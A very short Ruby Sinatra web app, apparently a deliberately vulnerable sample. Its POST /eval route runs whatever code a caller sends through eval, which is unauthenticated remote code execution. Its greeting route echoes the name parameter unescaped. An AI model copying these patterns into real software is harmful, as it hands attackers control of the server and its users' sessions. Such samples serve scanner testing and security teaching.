require 'sinatra'

get '/' do
  "Hello, #{params[:name] || 'World'}!"
end

post '/eval' do
  eval(params[:code]) if params[:code]
end